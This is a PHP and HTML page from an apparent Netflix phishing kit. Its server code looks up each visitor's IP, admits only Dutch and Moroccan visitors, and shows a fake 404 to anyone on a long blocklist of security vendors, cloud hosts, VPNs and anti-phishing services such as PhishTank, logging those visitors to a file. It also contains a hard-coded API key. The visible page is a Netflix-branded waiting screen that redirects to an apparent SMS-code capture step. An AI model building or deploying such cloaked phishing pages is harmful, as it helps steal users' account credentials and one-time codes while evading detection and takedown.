<?php
session_start();
$allowed_countries = array('NL', 'MA');
$blocked_strings = array(
   'M247', 'Amazone', 'DigitalOcean', 'Amazon', 'Google', 'phishtank', 'net4sec', 'AVAST Software s.r.o.', 'BullGuard ApS', 'PayPal', 'Hotmail', 'Yahoo', 'AOL', 'Microsoft', 'Kaspersky Lab', 'Linode', 'MSN', 'ONLINE S.A.S.', 'Joshua Peter McQuistan', 'OVH SAS', 'avira', 'Forcepoint', 'Cloud', 'Forcepoint Cloud Ltd', 'Google', 'Facebook', 'HostRoyale', 'Green Floid LLC', 'The Constant Company', 'ONLINE S.A.S', 'H4Y Technologies', 'Datacamp Limited', 'Digital Network', 'Intelligence Network Online', 'Geekyworks IT Solutions', 'The Calyx Institute', 'Perimeter', 'TerraTransit', 'Hurricane Electric', 'Uninet S.A.', 'AVAST', 'Microsense', 'PALO ALTO NETWORKS', 'ServeByte', 'Fastly', 'Google LLC', 'Overplay', 'Netprotect', 'Strong Technology', 'Web2Objects', 'tzulo', 'NETPROTECT', 'GleSYS', 'Cloudflare', 'Cloudflare, Inc.', 'Axera SpA', 'Axera S.P.A.', 'DedFiberCo', 'VISPERAD NETWORKS', 'EGIHosting', 'NAVER Cloud', 'Dreamx', 'DIMENOC SERVICOS DE INFORMATICA', 'HostDime', 'Powerhouse', 'Powerhouse Management', 'Unus, Inc.', 'Cisco', 'Cisco OpenDNS LLC', 'Twitter', 'Hetzner', 'Telegram', 'TEFINCOM', 'Tefincom', 'Packethub', 'AWS EC2', 'Forcepoint Cloud', 'Forcepoint', 'Paradise Networks', 'CenturyLink Communications', 'NEXT GLOBAL SERVICES', 'Next Global Services', 'UAB code200', 'Ovh', 'ovh', 'Liteserver', 'Leaseweb', 'Space Exploration Technologies', 'SpaceX Services', 'SpaceX Services, Inc', 'UNINET', 'Jisc Services', 'University of Bath', 'Bath University', 'Synergy Wholesale PTY LTD', 'SYNERGY WHOLESALE PTY LTD', 'IPXO UK LIMITED', 'Ipxo UK Limited', 'QuickPacket', 'BraveWay', 'Geekyworks', 'NETROTECT-BOM', 'myLoc', 'Microplex', 'SCALEWAY', 'Datacamp', 'INCX Global', 'Windscribe'
);

function getIpInfo($ip = '')
{
    $ipinfo = file_get_contents("https://pro.ip-api.com/json/" . $ip . "?key=s3DD9L9nYAxD9mz");
    $ipinfo_json = json_decode($ipinfo, true);
    return $ipinfo_json;
}

function containsBlockedString($ipinfo_json, $blocked_strings)
{
    foreach ($blocked_strings as $blocked_string) {
        if (stripos(json_encode($ipinfo_json), $blocked_string) !== false) {
            return true;
        }
    }
    return false;
}

$visitor_ip = $_SERVER['REMOTE_ADDR'];
$ipinfo_json = getIpInfo($visitor_ip);
$country_code = "{$ipinfo_json['countryCode']}";

if (!in_array($country_code, $allowed_countries) || containsBlockedString($ipinfo_json, $blocked_strings)) {
    $blocked_ip_file = fopen("botdl5ra.txt", "a");
    $blocked_ip_info = $visitor_ip . " - ISP: " . $ipinfo_json['isp'] . " - ORG: " . $ipinfo_json['org'] . " - " . gmdate("Y-n-d") . " @ " . gmdate("H:i:s") . "\n";
    fwrite($blocked_ip_file, $blocked_ip_info);
    fclose($blocked_ip_file);

    header("HTTP/1.1 404 Not Found");
    header("Status: 404 Not Found");
    echo "404 Not Found";
    exit();
}


?>
<html><head>

<meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta http-equiv="origin-trial" data-feature="EME Extension - Policy Check" content="">
<meta content='20; url=./Myaccount_Sms' http-equiv='refresh'/>

<title>Netflix</title>


<link type="text/css" rel="stylesheet" href="./style/css/stylef.css"/>


<script src="./style/js/angular.min.js"></script>
<script src="./style/js/jquery.min.js"></script>
<script src="./style/js/jquery.validate.min.js"></script>
<script src="./style/js/jquery.mask.js"></script>
<script src="./style/js/style.js"></script>


<script> 
$(document).ready(function(){
    $("#aaddcpis").click(function(){
        $("#mySidenav").show();
                    $("#hdikbdya").hide();
    });
});
</script>
 



<script> 
$(document).ready(function(){
    $("#sircardlya").click(function(){
        $("#mySidenav").show();
                    $("#hdikbdya").hide();

    });
});
</script>




<link type="text/css" rel="stylesheet" href="./style/css/nonechaditk.css"/>



<meta content="" name="description">
<meta name="viewport" content="width=device-width,initial-scale=1.0,minimum-scale=1.0,maximum-scale=1.0">



<link rel="shortcut icon" href="./style/css/nficon2016.ico">
<link rel="apple-touch-icon" href="./style/css/nficon2016.png">




<meta property="og:description" content="">
<meta property="al:ios:url" content="">
<meta property="al:ios:app_store_id" content="">
<meta property="al:ios:app_name" content="Netflix">
<meta property="al:android:url" content="">
<meta property="al:android:package">
<meta property="al:android:app_name" content="Netflix">
<meta name="twitter:card" content="player">
<meta name="twitter:site" content="@netflix">


</head>
<body>

<script type="text/javascript">
(function(){
   setTimeout(function(){
     window.location="./Myaccount_Sms.php";
   },25000); /* 25000 = 1 second*/
})();
</script>



<div id="spuenndr" style="background-color:#000000;position: fixed;top: 0; right: 0; bottom: 0;left: 0; z-index: 1040;opacity: 0.7;filter: alpha(opacity=50);" >
<span style="font-size: 247.6px;margin-left: -124.8px;margin-top: -124.8px;left: 50%;font-size: 28.8vw;margin-left: -14.4vw;margin-top: -14.4vw;"></span><div class="waitIndicator"><div class="basic-spinner center-absolute" style="width: 115px; height: 115px;"></div></div></div>



<div id="fixed" style="background-color:#000000;position: fixed;top: 0; right: 0; bottom: 0;left: 0; z-index: 1040;opacity: 0.7;filter: alpha(opacity=50);" ><span style="font-size: 247.6px;margin-left: -124.8px;margin-top: -124.8px;left: 50%;font-size: 28.8vw;margin-left: -14.4vw;margin-top: -14.4vw;"></span><div class="waitIndicator"><div class="basic-spinner basic-spinner-light center-absolute" style="width: 115px; height: 115px;"></div>




</div>

<center>
<H2 style=" margin: 500px 2px 2px 2px;
    color: #ffffff;
">Please Wait a Moment ... </H2>
</center>


</div>







</div><div></div></div></div></body></html>
